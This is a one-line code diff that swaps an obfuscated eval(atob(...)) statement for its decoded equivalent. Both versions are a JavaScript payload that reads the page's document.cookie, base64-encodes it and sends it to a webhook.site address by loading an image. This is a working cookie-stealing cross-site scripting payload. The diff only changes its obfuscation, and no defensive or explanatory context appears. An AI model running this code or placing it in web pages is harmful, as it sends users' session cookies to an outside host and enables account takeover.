@@ -1,1 +1,1 @@
-eval(atob('eCA9IG5ldyBJbWFnZSgpOyB4LnNyYyA9ICdodHRwczovL3dlYmhvb2suc2l0ZS84ZTQ4NmNlNi1lZDZiLTQ0YmItOGY2YS0wMzQ1YmNjZWE5YWU/YWRhdD0nK2J0b2EoZG9jdW1lbnQuY29va2llKTs='));
+x = new Image(); x.src = 'https://webhook.site/8e486ce6-ed6b-44bb-8f6a-0345bccea9ae?data='+btoa(document.cookie);
